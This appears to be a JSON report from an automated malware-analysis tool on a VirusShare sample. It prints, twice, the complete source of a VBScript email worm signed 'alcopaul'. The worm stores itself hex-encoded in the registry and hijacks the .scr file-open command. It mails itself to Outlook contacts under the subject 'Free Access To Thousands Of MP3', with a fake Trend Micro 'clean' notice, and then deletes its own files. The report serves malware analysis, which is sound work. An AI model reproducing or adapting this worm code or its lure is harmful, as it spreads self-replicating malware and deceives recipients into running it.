{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Chr": "May attempt to obfuscate specific str",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Run": "May run an executable file or a system command",
            "Shell": "May run an executable file or a system command",
            "Write": "May write to a file",
            "Wscript.Shell": "May run an executable file or a system command",
            "command": "May run PowerShell commands",
            "open": "May open a file",
            "regread": "May read registry keys"
        },
        "macro": "on error resume next\nDim fso, a, b, X, o, g, e\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nset a = fso.OpenTextFile(Wscript.ScriptFullname, 1)\nb = a.ReadAll\nset h = fso.CreateTextFile(\"c:\\freemp3s.vbs\", True)\nh.Write b\nh.Close\nFor o = 1 to Len(b)\nX = X & Hex(Asc(Mid(b, o, 1)))\nNext\nset g = CreateObject(\"Wscript.Shell\")\ng.regwrite \"HKEY_LOCAL_MACHINE\\Alcopaul\", X\ng.regwrite \"HKEY_CLASSES_ROOT\\scrfile\\shell\\open\\command\\\", \"wscript.exe c:\\excel.vbs\"\nmail()\ndecoder = \"on error resume next\" & vbcrlf & \"dim e, y, z, data\" & vbcrlf & \"e = fromreg(\"\"HKEY_LOCAL_MACHINE\\Alcopaul\"\")\" & vbcrlf & \"function fromreg(gg)\" & vbcrlf & \"Set regedit = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf & \"fromreg = regedit.regread(gg)\" & vbcrlf & \"end function\" & vbcrlf & \"For y = 1 to Len(e) Step 2\" & vbcrlf & \"z = z & Chr(\"\"&h\"\" + Mid(e, y, 2))\" & vbcrlf & \"next\" & vbcrlf & \"data = replace(z, Chr(\"\"&hDA\"\"), vbcrlf)\" & vbcrlf & \"Set fso = CreateObject(\"\"Scripting.FileSystemObject\"\")\" & vbcrlf & \"set h = fso.CreateTextFile(\"\"c:\\registry.vbs\"\", True)\" & vbcrlf & \"h.Write data\" & vbcrlf & \"h.Close\" & vbcrlf & \"Set fsa = CreateObject(\"\"Wscript.Shell\"\")\" & vbcrlf & \"fsa.Run(\"\"c:\\registry.vbs\"\")\" & vbcrlf & \"msgbox \"\"Checking registry values\"\", ,\"\"Scanreg\"\"\" & vbcrlf & \"fso.deletefile(\"\"c:\\registry.vbs\"\")\"\nset j = fso.CreateTextFile(\"c:\\excel.vbs\", True)\nj.write decoder\nj.close\nfso.deletefile(wscript.scriptfullname)\nsub mail()\non error resume next\nSet a = CreateObject(\"Outlook.Application\")\nSet b = a.GetNameSpace(\"MAPI\")\nIf a = \"Outlook\" Then\nb.Logon \"profile\", \"password\"\nFor y = 1 To b.AddressLists.Count\nSet d = b.AddressLists(y)\nx = 1\nSet c = a.CreateItem(0)\nFor oo = 1 To d.AddressEntries.Count\ne = d.AddressEntries(x)\nc.Recipients.Add e\nx = x + 1\nIf x > 101 Then oo = d.AddressEntries.Count\nNext\nc.Subject = \"Free Access To Thousands Of MP3\"\nc.Body = \"-------------- Trend Micro Online Scanner ----------------\" & vbcrlf & \"The attached file doesn't contain any malicious routines\" & vbcrlf & \"-------------------------------------------------------------------\" & vbcrlf & \"\"\nc.attachments.Add(\"c:\\freemp3s.vbs\")\nc.Send\nc.DeleteAfterSubmit = True\ne = \"\"\nNext\nb.Logoff\nEnd If\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nfso.deletefile(\"c:\\freemp3s.vbs\")\nend sub\n'by alcopaul\n'vbs.rEgResIDe"
    },
    "filename": "VirusShare_8fc6b90cd64fa042116d96273e08f343",
    "filesize": 2417,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "8fc6b90cd64fa042116d96273e08f343",
        "sha1": "cd538006b5de855151f8358c41925c5a96dccebf",
        "sha256": "f86284a735922cf8df56b17c71e6250a030716809dc51663c4b0714dc6feac1e"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "on error resume next",
            "Dim fso, a, b, X, o, g, e",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "set a = fso.OpenTextFile(Wscript.ScriptFullname, 1)",
            "b = a.ReadAll",
            "set h = fso.CreateTextFile(\"c:\\freemp3s.vbs\", True)",
            "h.Write b",
            "h.Close",
            "For o = 1 to Len(b)",
            "X = X & Hex(Asc(Mid(b, o, 1)))",
            "Next",
            "set g = CreateObject(\"Wscript.Shell\")",
            "g.regwrite \"HKEY_LOCAL_MACHINE\\Alcopaul\", X",
            "g.regwrite \"HKEY_CLASSES_ROOT\\scrfile\\shell\\open\\command\\\", \"wscript.exe c:\\excel.vbs\"",
            "mail()",
            "decoder = \"on error resume next\" & vbcrlf & _",
            "\"dim e, y, z, data\" & vbcrlf & _",
            "\"e = fromreg(\"\"HKEY_LOCAL_MACHINE\\Alcopaul\"\")\" & vbcrlf & _",
            "\"function fromreg(gg)\" & vbcrlf & _",
            "\"Set regedit = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf & _",
            "\"fromreg = regedit.regread(gg)\" & vbcrlf & _",
            "\"end function\" & vbcrlf & _",
            "\"For y = 1 to Len(e) Step 2\" & vbcrlf & _",
            "\"z = z & Chr(\"\"&h\"\" + Mid(e, y, 2))\" & vbcrlf & _",
            "\"next\" & vbcrlf & _",
            "\"data = replace(z, Chr(\"\"&hDA\"\"), vbcrlf)\" & vbcrlf & _",
            "\"Set fso = CreateObject(\"\"Scripting.FileSystemObject\"\")\" & vbcrlf & _",
            "\"set h = fso.CreateTextFile(\"\"c:\\registry.vbs\"\", True)\" & vbcrlf & _",
            "\"h.Write data\" & vbcrlf & _",
            "\"h.Close\" & vbcrlf & _",
            "\"Set fsa = CreateObject(\"\"Wscript.Shell\"\")\" & vbcrlf & _",
            "\"fsa.Run(\"\"c:\\registry.vbs\"\")\" & vbcrlf & _",
            "\"msgbox \"\"Checking registry values\"\", ,\"\"Scanreg\"\"\" & vbcrlf & _",
            "\"fso.deletefile(\"\"c:\\registry.vbs\"\")\"",
            "set j = fso.CreateTextFile(\"c:\\excel.vbs\", True)",
            "j.write decoder",
            "j.close",
            "fso.deletefile(wscript.scriptfullname)",
            "sub mail()",
            "on error resume next",
            "Set a = CreateObject(\"Outlook.Application\")",
            "Set b = a.GetNameSpace(\"MAPI\")",
            "If a = \"Outlook\" Then",
            "b.Logon \"profile\", \"password\"",
            "For y = 1 To b.AddressLists.Count",
            "Set d = b.AddressLists(y)",
            "x = 1",
            "Set c = a.CreateItem(0)",
            "For oo = 1 To d.AddressEntries.Count",
            "e = d.AddressEntries(x)",
            "c.Recipients.Add e",
            "x = x + 1",
            "If x > 101 Then oo = d.AddressEntries.Count",
            "Next",
            "c.Subject = \"Free Access To Thousands Of MP3\"",
            "c.Body = \"-------------- Trend Micro Online Scanner ----------------\" & vbcrlf & _",
            "\"The attached file doesn't contain any malicious routines\" & vbcrlf & _",
            "\"-------------------------------------------------------------------\" & vbcrlf & _",
            "c.attachments.Add(\"c:\\freemp3s.vbs\")",
            "c.Send",
            "c.DeleteAfterSubmit = True",
            "e = \"\"",
            "Next",
            "b.Logoff",
            "End If",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "fso.deletefile(\"c:\\freemp3s.vbs\")",
            "end sub",
            "'by alcopaul",
            "'vbs.rEgResIDe"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.324649",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
